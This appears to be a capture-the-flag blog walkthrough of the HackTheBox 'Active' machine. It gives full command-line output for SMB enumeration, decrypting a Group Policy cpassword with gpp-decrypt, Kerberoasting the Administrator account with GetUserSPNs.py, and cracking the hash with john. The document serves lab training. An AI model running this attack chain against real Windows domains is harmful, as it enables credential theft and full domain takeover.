---
image: /assets/img/active/active.png
layout: post
title: Active
date: 2020-11-01 00:00:01 +5:30
categories: [Hackthebox, Medium]
tags: [windows, active-directory, kerberoasting] # add tag
---

## Summary

> There is anonymous Access to smb share <br />
> Since the server is windows 2008, groups.xml in policy contains password for a user.<br />
> It can be decrypted using gpp-decrypt<br />
> Checking for the admin account. The account can be kerberoasted using the svc_tgs account.<br />

## Walkthrough

### Enumration

Let's start with scanning.

```terminal
argenestel@parrot  ~/Desktop/hackthebox/active  rustscan  10.10.10.100  
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
Faster Nmap scanning with Rust.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

[~] The config file is expected to be at "/home/argenestel/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitiv
e servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up
the Ulimit with '--ulimit 5000'.  
Open 10.10.10.100:53
Open 10.10.10.100:88
Open 10.10.10.100:135
Open 10.10.10.100:139
Open 10.10.10.100:389
Open 10.10.10.100:445
Open 10.10.10.100:464
Open 10.10.10.100:593
Open 10.10.10.100:636
Open 10.10.10.100:3269
Open 10.10.10.100:3268
Open 10.10.10.100:5722
Open 10.10.10.100:9389
Open 10.10.10.100:49152
Open 10.10.10.100:49153
Open 10.10.10.100:49154
Open 10.10.10.100:49155
Open 10.10.10.100:49157
Open 10.10.10.100:49158
Open 10.10.10.100:49169
Open 10.10.10.100:49172
Open 10.10.10.100:49182
[~] Starting Nmap
[>] The Nmap command to be run is nmap -vvv -p 53,88,135,139,389,445,464,593,636,3269,3268,5722,9389,49152
,49153,49154,49155,49157,49158,49169,49172,49182 10.10.10.100

Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-01 09:39 IST
Initiating Ping Scan at 09:39
Scanning 10.10.10.100 [2 ports]
Completed Ping Scan at 09:39, 0.26s elapsed (1 total hosts)
Initiating Connect Scan at 09:39
Scanning active.htb (10.10.10.100) [22 ports]
Discovered open port 139/tcp on 10.10.10.100
Discovered open port 53/tcp on 10.10.10.100
Discovered open port 3268/tcp on 10.10.10.100
Discovered open port 445/tcp on 10.10.10.100
Discovered open port 389/tcp on 10.10.10.100
Discovered open port 135/tcp on 10.10.10.100
Discovered open port 49158/tcp on 10.10.10.100
Discovered open port 49182/tcp on 10.10.10.100
Discovered open port 49157/tcp on 10.10.10.100
Discovered open port 3269/tcp on 10.10.10.100
Discovered open port 49152/tcp on 10.10.10.100
Discovered open port 49153/tcp on 10.10.10.100
Discovered open port 49169/tcp on 10.10.10.100
Discovered open port 49172/tcp on 10.10.10.100
Discovered open port 636/tcp on 10.10.10.100
Discovered open port 49154/tcp on 10.10.10.100
Discovered open port 9389/tcp on 10.10.10.100
Discovered open port 5722/tcp on 10.10.10.100
Discovered open port 49155/tcp on 10.10.10.100
Discovered open port 464/tcp on 10.10.10.100
Discovered open port 88/tcp on 10.10.10.100
Discovered open port 593/tcp on 10.10.10.100
Completed Connect Scan at 09:39, 0.49s elapsed (22 total ports)
Nmap scan report for active.htb (10.10.10.100)
Host is up, received conn-refused (0.25s latency).
Scanned at 2020-11-01 09:39:37 IST for 1s

PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack
88/tcp    open  kerberos-sec     syn-ack
135/tcp   open  msrpc            syn-ack
139/tcp   open  netbios-ssn      syn-ack
389/tcp   open  ldap             syn-ack
445/tcp   open  microsoft-ds     syn-ack
464/tcp   open  kpasswd5         syn-ack
593/tcp   open  http-rpc-epmap   syn-ack
636/tcp   open  ldapssl          syn-ack
3268/tcp  open  globalcatLDAP    syn-ack
3269/tcp  open  globalcatLDAPssl syn-ack
5722/tcp  open  msdfsr           syn-ack
9389/tcp  open  adws             syn-ack
49152/tcp open  unknown          syn-ack
49153/tcp open  unknown          syn-ack
49154/tcp open  unknown          syn-ack
49155/tcp open  unknown          syn-ack
49157/tcp open  unknown          syn-ack
49158/tcp open  unknown          syn-ack
49169/tcp open  unknown          syn-ack
49172/tcp open  unknown          syn-ack
49182/tcp open  unknown          syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.87 seconds

```

Running Default scripts.

```bash
argenestel@parrot  ~/Desktop/hackthebox/active/nmap  cat active                
# Nmap 7.80 scan initiated Sun Nov  1 09:52:53 2020 as: nmap -vvv -p 53,88,135,139,389,445,464,593,636,3269,3268,5722,9389,49152,49153,49154,49155,49157,49158,49169,49172,49182 -sC -sV -oN nmap/active 10.10.10.100
Nmap scan report for active.htb (10.10.10.100)
Host is up, received conn-refused (0.25s latency).
Scanned at 2020-11-01 09:52:53 IST for 199s

PORT      STATE SERVICE       REASON  VERSION
53/tcp    open  domain        syn-ack Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid:
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2020-11-01 04:27:05Z)
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack
464/tcp   open  kpasswd5?     syn-ack
593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack
3268/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack
5722/tcp  open  msrpc         syn-ack Microsoft Windows RPC
9389/tcp  open  mc-nmf        syn-ack .NET Message Framing
49152/tcp open  msrpc         syn-ack Microsoft Windows RPC
49153/tcp open  msrpc         syn-ack Microsoft Windows RPC
49154/tcp open  msrpc         syn-ack Microsoft Windows RPC
49155/tcp open  msrpc         syn-ack Microsoft Windows RPC
49157/tcp open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         syn-ack Microsoft Windows RPC
49169/tcp open  msrpc         syn-ack Microsoft Windows RPC
49172/tcp open  msrpc         syn-ack Microsoft Windows RPC
49182/tcp open  msrpc         syn-ack Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 4m01s
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 24711/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 40109/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 29284/udp): CLEAN (Failed to receive data)
|   Check 4 (port 38631/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode:
|   2.02:
|_    Message signing enabled and required
| smb2-time:
|   date: 2020-11-01T04:28:04
|_  start_date: 2020-11-01T04:11:17

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Nov  1 09:56:12 2020 -- 1 IP address (1 host up) scanned in 199.35 seconds
```

#### Domain port 53

from nmap, the domain is active.htb adding it into /etc/hosts
```terminal

argenestel@parrot  ~/Desktop/hackthebox/active  dig 10.10.10.100 @10.10.10.100

; <<>> DiG 9.16.6-Debian <<>> 10.10.10.100 @10.10.10.100
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: FORMERR, id: 295
;; flags: qr rd; QUERY: 1, ANSWER: 0, AUTHORITY: 0, ADDITIONAL: 1
;; WARNING: recursion requested but not available

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
; COOKIE: 4c963f3d36e16cb0 (echoed)
;; QUESTION SECTION:
;10.10.10.100.                  IN      A

;; Query time: 275 msec
;; SERVER: 10.10.10.100#53(10.10.10.100)
;; WHEN: Sun Nov 01 10:42:24 IST 2020
;; MSG SIZE  rcvd: 53
```

Nothing Interesting
Moving to smb

#### SMB Port

running enum4linux returned nothing so leaving the output moving on to check which shares are accessable to normal user.

```terminal
smbmap -H 10.10.10.100
[+] IP: 10.10.10.100:445        Name: active.htb                                         
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    NO ACCESS       Remote IPC
        NETLOGON                                                NO ACCESS       Logon server share  
        Replication                                             READ ONLY
        SYSVOL                                                  NO ACCESS       Logon server share  
        Users                                                   NO ACCESS
```

Reading Replication is possible.

```bash
argenestel@parrot  ~/Desktop/hackthebox/active/nmap  smbclient \\\\10.10.10.100/Replication
Enter WORKGROUP\argenestel's password:  
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> dir
 .                                   D        0  Sat Jul 21 16:07:44 2018
 ..                                  D        0  Sat Jul 21 16:07:44 2018
 active.htb                          D        0  Sat Jul 21 16:07:44 2018
ls -la
               10459647 blocks of size 4096. 4925385 blocks available
smb: \> ls -la
NT_STATUS_NO_SUCH_FILE listing \-la
smb: \> cd active.htb
smb: \active.htb\> dir
 .                                   D        0  Sat Jul 21 16:07:44 2018
 ..                                  D        0  Sat Jul 21 16:07:44 2018
 DfsrPrivate                       DHS        0  Sat Jul 21 16:07:44 2018
 Policies                            D        0  Sat Jul 21 16:07:44 2018
 scripts                             D        0  Thu Jul 19 00:18:57 2018

               10459647 blocks of size 4096. 4925385 blocks available
smb: \active.htb\> recurse
smb: \active.htb\> ls
 .                                   D        0  Sat Jul 21 16:07:44 2018
 ..                                  D        0  Sat Jul 21 16:07:44 2018
 DfsrPrivate                       DHS        0  Sat Jul 21 16:07:44 2018
 Policies                            D        0  Sat Jul 21 16:07:44 2018
 scripts                             D        0  Thu Jul 19 00:18:57 2018

\active.htb\DfsrPrivate
 .                                 DHS        0  Sat Jul 21 16:07:44 2018
 ..                                DHS        0  Sat Jul 21 16:07:44 2018
 ConflictAndDeleted                  D        0  Thu Jul 19 00:21:30 2018
 Deleted                             D        0  Thu Jul 19 00:21:30 2018
 Installing                          D        0  Thu Jul 19 00:21:30 2018

\active.htb\Policies
 .                                   D        0  Sat Jul 21 16:07:44 2018
 ..                                  D        0  Sat Jul 21 16:07:44 2018
 {31B2F340-016D-11D2-945F-00C04FB984F9}      D        0  Sat Jul 21 16:07:44 2018
 {6AC1786C-016F-11D2-945F-00C04fB984F9}      D        0  Sat Jul 21 16:07:44 2018

\active.htb\scripts
 .                                   D        0  Thu Jul 19 00:18:57 2018
 ..                                  D        0  Thu Jul 19 00:18:57 2018

\active.htb\DfsrPrivate\ConflictAndDeleted
 .                                   D        0  Thu Jul 19 00:21:30 2018
 ..                                  D        0  Thu Jul 19 00:21:30 2018

\active.htb\DfsrPrivate\Deleted
 .                                   D        0  Thu Jul 19 00:21:30 2018
 ..                                  D        0  Thu Jul 19 00:21:30 2018

\active.htb\DfsrPrivate\Installing
 .                                   D        0  Thu Jul 19 00:21:30 2018
 ..                                  D        0  Thu Jul 19 00:21:30 2018

\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}
 .                                   D        0  Sat Jul 21 16:07:44 2018
 ..                                  D        0  Sat Jul 21 16:07:44 2018
 GPT.INI                             A       23  Thu Jul 19 02:16:06 2018
 Group Policy                        D        0  Sat Jul 21 16:07:44 2018
 MACHINE                             D        0  Sat Jul 21 16:07:44 2018
 USER                                D        0  Thu Jul 19 00:19:12 2018

\active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}
 .                                   D        0  Sat Jul 21 16:07:44 2018
 ..                                  D        0  Sat Jul 21 16:07:44 2018
 GPT.INI                             A       22  Thu Jul 19 00:19:12 2018
 MACHINE                             D        0  Sat Jul 21 16:07:44 2018
 USER                                D        0  Thu Jul 19 00:19:12 2018

\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Group Policy
 .                                   D        0  Sat Jul 21 16:07:44 2018
 ..                                  D        0  Sat Jul 21 16:07:44 2018
 GPE.INI                             A      119  Thu Jul 19 02:16:06 2018

\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE
 .                                   D        0  Sat Jul 21 16:07:44 2018
 ..                                  D        0  Sat Jul 21 16:07:44 2018
 Microsoft                           D        0  Sat Jul 21 16:07:44 2018
 Preferences                         D        0  Sat Jul 21 16:07:44 2018
 Registry.pol                        A     2788  Thu Jul 19 00:23:45 2018

\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\USER
 .                                   D        0  Thu Jul 19 00:19:12 2018
 ..                                  D        0  Thu Jul 19 00:19:12 2018

\active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE
 .                                   D        0  Sat Jul 21 16:07:44 2018
 ..                                  D        0  Sat Jul 21 16:07:44 2018
 Microsoft                           D        0  Sat Jul 21 16:07:44 2018

\active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\USER
 .                                   D        0  Thu Jul 19 00:19:12 2018
 ..                                  D        0  Thu Jul 19 00:19:12 2018

\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft
 .                                   D        0  Sat Jul 21 16:07:44 2018
 ..                                  D        0  Sat Jul 21 16:07:44 2018
 Windows NT                          D        0  Sat Jul 21 16:07:44 2018

\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences
 .                                   D        0  Sat Jul 21 16:07:44 2018
 ..                                  D        0  Sat Jul 21 16:07:44 2018
 Groups                              D        0  Sat Jul 21 16:07:44 2018

\active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft
 .                                   D        0  Sat Jul 21 16:07:44 2018
 ..                                  D        0  Sat Jul 21 16:07:44 2018
 Windows NT                          D        0  Sat Jul 21 16:07:44 2018

\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT
 .                                   D        0  Sat Jul 21 16:07:44 2018
 ..                                  D        0  Sat Jul 21 16:07:44 2018
 SecEdit                             D        0  Sat Jul 21 16:07:44 2018

\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups
 .                                   D        0  Sat Jul 21 16:07:44 2018
 ..                                  D        0  Sat Jul 21 16:07:44 2018
 Groups.xml                          A      533  Thu Jul 19 02:16:06 2018

\active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\Windows NT
 .                                   D        0  Sat Jul 21 16:07:44 2018
 ..                                  D        0  Sat Jul 21 16:07:44 2018
 SecEdit                             D        0  Sat Jul 21 16:07:44 2018

\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\SecEdit
 .                                   D        0  Sat Jul 21 16:07:44 2018
 ..                                  D        0  Sat Jul 21 16:07:44 2018
 GptTmpl.inf                         A     1098  Thu Jul 19 00:19:12 2018

\active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\Windows NT\SecEdit
 .                                   D        0  Sat Jul 21 16:07:44 2018
 ..                                  D        0  Sat Jul 21 16:07:44 2018
 GptTmpl.inf                         A     3722  Thu Jul 19 00:19:12 2018

               10459647 blocks of size 4096. 4925385 blocks available

```

groups.xml looks Interestin.

```terminal
argenestel@parrot  ~/Desktop/hackthebox/active/nmap  cat Groups.xml
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>
```
SVC_TGS is username.
Okay so I can see cpassword and searching about it, can be decrypted using gpp-decrypt.

### Exploitation

#### User SVC_TGS

```terminal
argenestel@parrot  ~/Desktop/hackthebox/active/nmap  gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
/usr/bin/gpp-decrypt:21: warning: constant OpenSSL::Cipher::Cipher is deprecated
<redacted>
```

Here we go moving on to what we can do.

argenestel@parrot  ~/Desktop/hackthebox/active/nmap  smbmap -u SVC_TGS -p <redacted> -H 10.10.10.100             
[+] IP: 10.10.10.100:445        Name: active.htb                                        
       Disk                                                    Permissions     Comment
       ----                                                    -----------     -------
       ADMIN$                                                  NO ACCESS       Remote Admin
       C$                                                      NO ACCESS       Default share
       IPC$                                                    NO ACCESS       Remote IPC
       NETLOGON                                                READ ONLY       Logon server share
       Replication                                             READ ONLY
       SYSVOL                                                  READ ONLY       Logon server share
       Users                                                   READ ONLY

Users share will give user.txt

Moving on to administrator<br />
can i kerberoast administrator?<br />
Trying out few random things lead me to this conclusion.

<https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md>

+ biggest spoiler from PayloadsAllTheThings.

#### Administrator

```terminal
argenestel@parrot  ~/Desktop/hackthebox/active/nmap  GetUserSPNs.py active.htb/SVC_TGS:<redacted> -dc-ip 10.10.10.100 -request
/home/argenestel/.local/lib/python2.7/site-packages/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer suppo
rted by the Python core team. Support for it is now deprecated in cryptography, and will be removed in a future release.
  from cryptography import x509
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon
                  Delegation  
--------------------  -------------  --------------------------------------------------------  --------------------------  ----------
----------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-19 00:36:40.351723  2018-07-30
 22:47:40.656520              



$krb5tgs$23$*Administrator$ACTIVE.HTB$active/CIFS~445*$0c46bb20097739b1bfe26fee14b7a298$594d843b64492268a7cc09da5a7679234dcb9cd4eb63c
01b5f91bade59f0f73f79717fa02ece84219b8fdd4bb4ed06c0a8dec3209bab143f2039fcc9c4b6b7027355d64855bafd19815682ae041faa5f222ba90c3de9341efc
898d153e3bcfa060499f4928304d26227a27c64edb8a3e9acc86d5332cc4d96245138c7f7120a82de23bd320e5fa158f41b1988371851b9d141ef37f06b10c1684c5e
84c02e0cbe5bb39560ae386c5429b0bc3a2fbb54c5ab71b986f8a8ddae91be1fd230b158d7b5293604adc70d9660843c
....<continue>
```

Alright we get krb hash let's check if we can crack it and get administrator

```bash
✘ argenestel@parrot  ~/Desktop/hackthebox/active/nmap  john --wordlist=/usr/share/wordlists/rockyou.txt admin.spn  
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
<redacted> (?)
1g 0:00:00:12 DONE (2020-11-01 14:32) 0.07936g/s 836347p/s 836347c/s 836347C/s Tiffani1432..Thrash1
Use the "--show" option to display all of the cracked passwords reliably
Session completed
argenestel@parrot  ~/Des
```

Done....

We can extract administrator root.txt by loging into psexec or smb.

```terminal
[+] IP: 10.10.10.100:445        Name: active.htb                                        
[/] Work[!] Unable to remove test directory at \\10.10.10.100\SYSVOL\NERGHTUYIV, please remove manually
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  READ, WRITE     Remote Admin
        C$                                                      READ, WRITE     Default share
        IPC$                                                    NO ACCESS       Remote IPC
        NETLOGON                                                READ, WRITE     Logon server share
        Replication                                             READ ONLY
        SYSVOL                                                  READ, WRITE     Logon server share
        Users                                                   READ ONLY
```
